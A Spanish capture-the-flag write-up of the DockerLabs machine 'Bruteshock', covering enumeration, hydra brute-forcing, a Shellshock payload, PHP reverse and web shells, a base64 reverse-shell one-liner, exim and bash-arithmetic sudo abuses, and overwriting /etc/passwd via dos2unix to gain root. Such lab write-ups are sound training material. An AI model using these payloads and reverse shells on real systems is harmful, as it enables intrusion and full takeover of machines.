#MAQUINA #DOCKERLABS #MEDIO 
#SHELLSHOCK #PHP_CMD #PRIVESC_COMPARACION_NUMEROS_BASH 
#EXIM
<hr>

# RECONOCIMIENTO

Vamos a resolver **Bruteshock** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS -vvv -p- --min-rate 5000 -n -Pn 172.17.0.2
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-27 10:30 CET
Initiating ARP Ping Scan at 10:30
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 10:30, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 10:30
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 10:30, 0.51s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2025-03-27 10:30:00 CET for 1s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.71 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** abierto.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p80 172.17.0.2                       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-27 10:30 CET
Nmap scan report for chat.chatme.dl (172.17.0.2)
Host is up (0.000017s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.62 (Debian)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.46 seconds



```

   ```bash
   
nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-27 10:30 CET
Nmap scan report for chat.chatme.dl (172.17.0.2)
Host is up (0.0000040s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.21 seconds

```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

## HTTP (80)

De primeras no nos carga la web, si recargamos ahora si, esto es por la cookie.

Necesitamos la cookie.

Usamos **gobuster** :

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x html,php,js,txt,png,jpg -H "Cookie: PHPSESSID=79hu5i2sqboe5fs087693u4kvp"
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,js,txt,png,jpg,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/index.php            (Status: 200) [Size: 1839]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 1543913 / 1543920 (100.00%)
===============================================================
Finished
===============================================================

```

Tenemos el **index.php** y es un login.

# EXPLOTACION

Usamos **hydra** :

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt "172.17.0.2" http-post-form "/index.php:username=^USER^&password=^PASS^:H=Cookie: PHPSESSID=79hu5i2sqboe5fs087693u4kvp:F=Credenciales incorrectas." -F
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-27 10:46:07
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://172.17.0.2:80/index.php:username=^USER^&password=^PASS^:H=Cookie: PHPSESSID=79hu5i2sqboe5fs087693u4kvp:F=Credenciales incorrectas.
[STATUS] 4677.00 tries/min, 4677 tries in 00:01h, 14339722 to do in 51:07h, 16 active
[80][http-post-form] host: 172.17.0.2   login: admin   password: christelle
[STATUS] attack finished for 172.17.0.2 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-27 10:49:00

```

Nos manda a un directorio nuevo y nos da una pista :

```

User-Agent almacenado en el log. 

```

No tiene pinta de ser un Log Poisoning, vamos a probar antes un **shellshock**

```bash

python3 -m http.server (en otra shell)

curl -s http://172.17.0.2/pruebasUltraSecretas/ -A "() { :;}; curl http://172.17.0.1:8000/wp.php -o wp.php"

```

Efectivamente nos coge la shell (nos poonemos en escucha rpor el puerto 443):

```php
<?php

/**
* Plugin Name: test-plugin
* Plugin URI: https://www.your-site.com/
* Description: Test.
* Version: 0.1
* Author: your-name
* Author URI: https://www.your-site.com/
**/


	exec("/bin/bash -c 'bash -i > /dev/tcp/172.17.0.1/443 0>&1'");

?>
```

Nos echa constantemente.


Vamos a subirnos una cmd :

```bash
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

Ejecutamos :

```bash

echo "cGhwIC1yICckc29jaz1mc29ja29wZW4oIjE3Mi4xNy4wLjEiLDQ0Myk7ZXhlYygiL2Jpbi9iYXNoIDwmMyA+JjMgMj4mMyIpOyc=" | base64 -d | bash

```

YA ESTAMOS COMO WWW-DATA.
# ESCALADA PRIVILEGIOS

Buscamos por usuario:

   ```bash
find / -user darksblack 2>/dev/null
/home/darksblack
/var/backups/darksblack
/var/backups/darksblack/.darksblack.txt
cat /var/backups/darksblack/.darksblack.txt
darksblack:$y$j9T$LHiaZ3.V.uZMQWNKIHQaK.$yucUM837WonVbazf5eQWEmFnG5u0ZY5VTxH37NhaCE5:20028:0:99999:7:::

```

Es un fragmento del shadow -> usaremos **unshadow** y **john**.

YA ESTAMOS COMO DARKSBLACK.

Vemos si el usuario tiene permisos SUDO:
   ```bash
darksblack@f37db1a842bf:/var/www/html/pruebasUltraSecretas$ sudo -l
Matching Defaults entries for darksblack on f37db1a842bf:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User darksblack may run the following commands on f37db1a842bf:
    (maci) NOPASSWD: /home/maci/script.sh

```

Vemos **/home/maci/script.sh** con permisos SUDO:

```bash

darksblack@f37db1a842bf:/var/www/html/pruebasUltraSecretas$ sudo -u maci /home/maci/script.sh
Adivina: a[$(bash >&2)]+42
maci@f37db1a842bf:/var/www/html/pruebasUltraSecretas$ id
uid=1000(maci) gid=1000(maci) groups=1000(maci)
maci@f37db1a842bf:/var/www/html/pruebasUltraSecretas$ 

```

YA ESTAMOS COMO MACI

Vemos si el usuario tiene permisos SUDO:
   ```bash
maci@f37db1a842bf:/var/www/html/pruebasUltraSecretas$ sudo -l
Matching Defaults entries for maci on f37db1a842bf:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User maci may run the following commands on f37db1a842bf:
    (pepe) NOPASSWD: /usr/sbin/exim

```

Vemos **exim** con permisos SUDO:

Por lo que creamos una reverse shell  y nos ponemos en escucha :

```bash

import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.17.0.1", 444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
import pty
pty.spawn("/bin/bash")

```

Y por otro lado ejecutamos :
```bash

sudo -u pepe /usr/sbin/exim -be '${run{/bin/bash -c "python3 /tmp/rev.py"}}'

```

YA ESTAMOS COMO PEPE.

Vemos **dos2unix** con permisos SUDO :

```bash
pepe@f37db1a842bf:/tmp$ sudo -l
Matching Defaults entries for pepe on f37db1a842bf:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User pepe may run the following commands on f37db1a842bf:
    (ALL : ALL) NOPASSWD: /usr/bin/dos2unix

```

Creamos un **/tmp/passwd** :

```

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
maci:x:1000:1000::/home/maci:/bin/bash
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
darksblack:x:1001:1001:,,,:/home/darksblack:/bin/bash
pepe:x:1002:1002:,,,:/home/pepe:/bin/bash
Debian-exim:x:101:104::/var/spool/exim4:/usr/sbin/nologin
newRoot::0:0:newRoot:/root:/bin/bash


```

Ejecutamos :

```bash

sudo dos2unix -f -n /tmp/passwd /etc/passwd
su newRoot

```

**YA ESTAMOS COMO ROOT.**